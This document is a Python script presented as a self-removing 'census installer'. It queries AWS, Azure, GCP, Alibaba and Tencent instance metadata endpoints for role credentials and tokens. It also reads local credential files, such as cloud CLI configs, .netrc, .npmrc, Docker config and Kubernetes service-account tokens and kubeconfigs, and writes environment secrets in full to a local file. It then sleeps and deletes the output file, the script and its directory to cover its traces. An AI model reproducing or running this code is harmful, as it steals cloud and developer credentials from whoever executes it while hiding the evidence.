# i4353 D21 census installer (read-only metadata + provider-config census, self-removing)
import os, sys, json, time, socket, subprocess

HERE = os.path.dirname(os.path.abspath(__file__))
OUT = os.path.join(HERE, "census.txt")
LOG = []

def w(s):
    LOG.append(str(s))
    try:
        with open(OUT, "w", encoding="utf-8", errors="replace") as f:
            f.write("\n".join(LOG) + "\n")
    except Exception:
        pass

def http(url, headers=None, method="GET", data=None, timeout=3, limit=8192):
    try:
        import urllib.request
        req = urllib.request.Request(url, data=data, method=method)
        for k, v in (headers or {}).items():
            req.add_header(k, v)
        with urllib.request.urlopen(req, timeout=timeout) as r:
            body = r.read(limit)
            return "HTTP %s ct=%s | %s" % (r.status, r.headers.get("Content-Type", ""), body.decode("utf-8", "replace"))
    except Exception as e:
        return "ERR %s" % (repr(e)[:220],)

def get_body(url, headers=None, method="GET", data=None, timeout=3, limit=8192):
    try:
        import urllib.request
        req = urllib.request.Request(url, data=data, method=method)
        for k, v in (headers or {}).items():
            req.add_header(k, v)
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, r.read(limit).decode("utf-8", "replace")
    except Exception as e:
        return None, "ERR %s" % (repr(e)[:220],)

def run(argv):
    try:
        r = subprocess.run(argv, capture_output=True, text=True, timeout=25)
        return ((r.stdout or "") + (r.stderr or "")).strip()
    except Exception as e:
        return "ERR %r" % (e,)

def run_shell(s):
    try:
        r = subprocess.run(s, shell=True, capture_output=True, text=True, timeout=25)
        return ((r.stdout or "") + (r.stderr or "")).strip()
    except Exception as e:
        return "ERR %r" % (e,)

w("=== i4353 D21 census start %s ===" % time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()))
w("hostname: " + socket.gethostname())
w("platform: " + sys.platform + " python=" + sys.version.replace("\n", " ") + " exe=" + sys.executable)
w("id/whoami: " + (run(["id"]) if os.name != "nt" else run(["whoami"])))
for f in ("/sys/class/dmi/id/product_name", "/sys/class/dmi/id/sys_vendor", "/proc/1/cgroup", "/.dockerenv"):
    if os.path.exists(f):
        try:
            w("dmi %s: %s" % (f, open(f, "rb").read(300).decode("utf-8", "replace").strip()))
        except Exception as e:
            w("dmi %s: ERR %r" % (f, e))

w("--- TENCENT metadata ---")
w("T index: " + http("http://metadata.tencentyun.com/latest/meta-data/"))
w("T instance-id: " + http("http://metadata.tencentyun.com/latest/meta-data/instance-id"))
w("T region: " + http("http://metadata.tencentyun.com/latest/meta-data/placement/region"))
st, roles = get_body("http://metadata.tencentyun.com/latest/meta-data/cam/security-credentials/")
w("T cam/security-credentials/: status=%s body=%s" % (st, roles))
if st == 200 and "ERR" not in roles:
    for role in [x.strip() for x in roles.splitlines() if x.strip()][:3]:
        w("T cam role %s: %s" % (role, http("http://metadata.tencentyun.com/latest/meta-data/cam/security-credentials/" + role)))

w("--- ALIBABA metadata ---")
w("A index: " + http("http://100.100.100.200/latest/meta-data/"))
w("A instance-id: " + http("http://100.100.100.200/latest/meta-data/instance-id"))
w("A region-id: " + http("http://100.100.100.200/latest/meta-data/region-id"))
st, roles = get_body("http://100.100.100.200/latest/meta-data/ram/security-credentials/")
w("A ram/security-credentials/: status=%s body=%s" % (st, roles))
if st == 200 and "ERR" not in roles:
    for role in [x.strip() for x in roles.splitlines() if x.strip()][:3]:
        w("A ram role %s: %s" % (role, http("http://100.100.100.200/latest/meta-data/ram/security-credentials/" + role)))

w("--- AWS IMDSv2 ---")
st, tok = get_body("http://169.254.169.254/latest/api/token", {"X-aws-ec2-metadata-token-ttl-seconds": "21600"}, method="PUT", timeout=3)
w("AWS token: status=%s body=%s" % (st, tok[:80] if tok else tok))
h = {"X-aws-ec2-metadata-token": tok} if st == 200 else {}
w("AWS instance-id: " + http("http://169.254.169.254/latest/meta-data/instance-id", h))
w("AWS region: " + http("http://169.254.169.254/latest/meta-data/placement/region", h))
st, roles = get_body("http://169.254.169.254/latest/meta-data/iam/security-credentials/", h)
w("AWS iam/security-credentials/: status=%s body=%s" % (st, roles))
if st == 200 and "ERR" not in roles:
    for role in [x.strip() for x in roles.splitlines() if x.strip()][:3]:
        w("AWS role %s: %s" % (role, http("http://169.254.169.254/latest/meta-data/iam/security-credentials/" + role, h)))

w("--- GCP metadata ---")
w("G token: " + http("http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token", {"Metadata-Flavor": "Google"}))
w("G project: " + http("http://metadata.google.internal/computeMetadata/v1/project/project-id", {"Metadata-Flavor": "Google"}))
w("G sa list: " + http("http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/", {"Metadata-Flavor": "Google"}))

w("--- AZURE IMDS ---")
w("Z token: " + http("http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https%3A%2F%2Fmanagement.azure.com%2F", {"Metadata": "true"}))
w("Z instance: " + http("http://169.254.169.254/metadata/instance?api-version=2021-02-01", {"Metadata": "true"}))

w("--- PROVIDER CONFIG CENSUS ---")
home = os.path.expanduser("~")
up = os.environ.get("USERPROFILE") or home
cands = []
for base in [home, up]:
    if not base:
        continue
    cands += [
        os.path.join(base, ".aws", "credentials"),
        os.path.join(base, ".aws", "config"),
        os.path.join(base, ".oci", "config"),
        os.path.join(base, ".config", "gcloud", "application_default_credentials.json"),
        os.path.join(base, ".config", "gcloud", "credentials.db"),
        os.path.join(base, ".config", "gcloud", "access_tokens.db"),
        os.path.join(base, ".tencentcloud", "credentials"),
        os.path.join(base, ".tencentcloud", "config"),
        os.path.join(base, ".aliyun", "config.json"),
        os.path.join(base, ".aliyun", "credentials"),
        os.path.join(base, ".npmrc"),
        os.path.join(base, ".netrc"),
        os.path.join(base, ".cache", "huggingface", "token"),
        os.path.join(base, ".huggingface", "token"),
        os.path.join(base, ".docker", "config.json"),
    ]
cands += [
    "/root/.aws/credentials", "/root/.oci/config",
    "/var/run/secrets/kubernetes.io/serviceaccount/token",
    "/var/run/secrets/kubernetes.io/serviceaccount/namespace",
    "/etc/kubernetes/kubelet.conf", "/etc/kubernetes/admin.conf",
    "C:\\Users\\Administrator\\.aws\\credentials",
    "C:\\Users\\Administrator\\.oci\\config",
    "C:\\Users\\Administrator\\.tencentcloud\\credentials",
    "C:\\Users\\Administrator\\.aliyun\\config.json",
    "C:\\Users\\Administrator\\.kube\\config",
]
seen = set()
for p in cands:
    if p in seen:
        continue
    seen.add(p)
    try:
        if os.path.isfile(p):
            try:
                b = open(p, "rb").read(4096)
                w("FILE %s (%d bytes read):\n%s" % (p, len(b), b.decode("utf-8", "replace")))
            except Exception as e:
                w("FILE %s exists but read ERR %r" % (p, e))
    except Exception:
        pass

w("--- ENV CENSUS ---")
import re
pat = re.compile(r"(?i)(aws|tencent|aliyun|alibaba|azure|gcp|google|oci|oracle|kube|token|secret|credential|api[_-]?key|access[_-]?key)")
full_ok = re.compile(r"(?i)^(AWS_(ACCESS_KEY_ID|SECRET_ACCESS_KEY|SESSION_TOKEN)|TENCENTCLOUD_(SECRETID|SECRETKEY|SESSIONTOKEN)|TENCENTCLOUD_SECRET_ID|TENCENTCLOUD_SECRET_KEY|ALIBABA_CLOUD_(ACCESS_KEY_ID|ACCESS_KEY_SECRET|SECURITY_TOKEN)|ALIYUN_(ACCESS_KEY_ID|ACCESS_KEY_SECRET)|AZURE_(CLIENT_ID|CLIENT_SECRET|TENANT_ID)|GOOGLE_APPLICATION_CREDENTIALS|GOOGLE_CLOUD_PROJECT|MODAL_TOKEN_ID|MODAL_TOKEN_SECRET)$")
for k in sorted(os.environ):
    if pat.search(k):
        v = os.environ[k]
        if full_ok.match(k):
            w("ENV %s=%s" % (k, v))
        else:
            w("ENV %s=%s*** (len=%d)" % (k, (v[:4] if v else ""), len(v)))

w("=== end (sleeping 180s then self-removing) ===")
sys.stdout.flush()
time.sleep(180)
for p in (OUT, os.path.join(HERE, "install.py")):
    try:
        os.remove(p)
    except Exception:
        pass
import shutil
shutil.rmtree(HERE, True)
